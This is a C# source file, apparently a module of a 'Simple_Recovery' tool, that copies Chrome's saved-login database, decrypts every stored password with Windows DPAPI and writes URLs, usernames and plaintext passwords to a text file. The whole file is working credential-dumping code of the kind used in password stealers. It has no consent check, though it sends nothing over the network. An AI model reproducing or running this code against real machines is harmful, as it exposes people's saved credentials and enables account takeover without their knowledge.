using System;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Dapper;

namespace Simple_Recovery.Modules
{
    internal class User
    {
        public long DateCreated;
        
        public string OriginUrl;
        
        public string ActionUrl;

        public string UsernameValue;

        public byte[] PasswordValue;
        
    }

    public static class Chrome
    {
        // Get the entries within the database

        private static StringBuilder GetDatabaseEntries()
        {
            // Default folder path for the database
            
            var folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
            
            var databaseEntries = new StringBuilder();
            
            // If the directory cannot be found end the function

            if (!Directory.Exists(folderPath))
            {
                databaseEntries.AppendLine("Failed to find the default directory for Chrome");
                
                return databaseEntries;
            }

            // Create a copy of the database - Chrome has the original database open and is therefore locked

            if (File.Exists(folderPath + @"\Login Data Copy"))
            {
                File.Delete(folderPath + @"\Login Data Copy");

                File.Copy(folderPath + @"\Login Data", folderPath + @"\Login Data Copy");
            }

            else
            {
                File.Copy(folderPath + @"\Login Data", folderPath + @"\Login Data Copy");
            }

            using (var connection = new SQLiteConnection("Data Source=" + folderPath + @"\Login Data Copy"))
            {
                // Query used to get the database entries

                const string statement = "SELECT date_created DateCreated, origin_url OriginUrl, action_url ActionUrl, username_value UsernameValue, password_value PasswordValue FROM logins";
                
                // Open the database

                connection.Open();

                // Build a list of objects from the database query

                var entries = connection.Query<User>(statement);

                foreach (var entry in entries)
                {
                    // Decrypt the password

                    var decryptedPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(entry.PasswordValue, null, DataProtectionScope.CurrentUser));

                    // Convert the value of DateCreated to datetime
                   
                    var epoch = new DateTime(1601, 1, 1, 12, 0, 0).AddSeconds(entry.DateCreated / 1000000);

                    databaseEntries.AppendLine($"{epoch} : {entry.OriginUrl} : {entry.ActionUrl} : {entry.UsernameValue} : {decryptedPassword}");
                }
            }

            // Delete the database copy

            File.Delete(folderPath + @"\Login Data Copy");

            return databaseEntries;
        }

        // Write the entries to a file

        public static void WriteToFile(string path)
        {
            var databaseEntries = GetDatabaseEntries();

            File.WriteAllText(path + @"\Chrome.txt", databaseEntries.ToString());
        }
    }
}